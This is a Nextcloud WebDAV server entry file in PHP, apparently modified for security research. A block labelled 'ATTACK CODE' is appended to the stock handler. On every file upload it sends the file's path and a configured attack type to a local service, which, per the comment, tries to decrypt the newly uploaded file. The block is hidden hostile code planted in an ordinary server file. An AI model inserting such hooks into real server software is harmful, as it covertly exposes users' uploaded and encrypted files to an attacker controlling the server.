<?php
/**
 * @copyright Copyright (c) 2016, ownCloud, Inc.
 *
 * @author Ko- <k.stoffelen@cs.ru.nl>
 * @author Thomas Müller <thomas.mueller@tmit.eu>
 * @author Vincent Petry <vincent@nextcloud.com>
 *
 * @license AGPL-3.0
 *
 * This code is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License, version 3,
 * as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License, version 3,
 * along with this program. If not, see <http://www.gnu.org/licenses/>
 *
 */
// no php execution timeout for webdav
if (strpos(@ini_get('disable_functions'), 'set_time_limit') === false) {
	@set_time_limit(0);
}
ignore_user_abort(true);

// Turn off output buffering to prevent memory problems
\OC_Util::obEnd();

$request = \OC::$server->getRequest();
$server = new \OCA\DAV\Server($request, $baseuri);
$server->exec();
//BEGIN ATTACK CODE
/*
This section simply notifies the python script each time an update 
happens. The python script will try to decrypt the freshly added 
file. 
*/
if($request->getMethod() == 'PUT' and strpos($request->getPathInfo(), "files") !== false){
	try {
		$path = $request->getPathInfo();
		$url = "http://localhost:5003";
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$config = json_decode(file_get_contents("/var/www/nextcloud/config/config.json"));
		// $config = \OC::$server->get(\OCP\IConfig::class);
		$content = array('type' => $config->attack->type,
						 'uri' => $path);
		$content = json_encode($content);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
		$resp = curl_exec($curl);
		curl_close($curl);
	}catch (\Error $e){
		return;
	}catch (\Exception $e){
		return;
	}
}
//END ATTACK CODE